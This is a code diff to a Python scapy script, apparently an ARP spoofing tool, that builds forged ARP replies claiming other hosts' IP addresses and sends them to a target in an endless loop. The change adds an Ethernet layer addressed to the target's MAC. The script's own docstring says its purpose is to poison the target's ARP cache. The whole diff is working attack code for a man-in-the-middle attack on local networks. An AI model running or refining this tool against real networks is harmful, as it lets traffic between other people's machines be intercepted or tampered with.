@@ -1,6 +1,6 @@
 from scapy import packet
-from scapy.layers.l2 import ARP
-from scapy.sendrecv import sendp, sniff
+from scapy.layers.l2 import Ether, ARP
+from scapy.sendrecv import sendp
 import time
 import threading
 
@@ -46,19 +46,22 @@ class ARPSpoofing(threading.Thread):
                     :return: Spoofed ARP packet that can be used to poison ARP cache
                 """
 
-                spoofed_resp = ARP(
+                # Create Ethernet and ARP layers, src MAC is not required as it is host MAC by default
+                resp_ether = Ether(dst=target_mac)
+                resp_arp = ARP(
                     op=2,   # 2 = ARP response, 1 = ARP request
                     psrc=spoofed_ip,
                     pdst=target_ip,
                     hwdst=target_mac,
-                    # hwsrc Not required since this is set as host mac (attacker mac) by default
                 )
+                spoofed_resp = resp_ether / resp_arp
 
                 return spoofed_resp
 
             for ip in self.spoofed_ips:
                 spoofed_ans = create_spoofed_arp_answer(ip, self.target_ip, self.target_mac)
-                sendp(spoofed_ans, iface=self.interface)
+                # TODO: Set verbose to False or make it configurable
+                sendp(spoofed_ans, iface=self.interface, verbose=True)
 
         print("Now ARP spoofing...")
         while True:
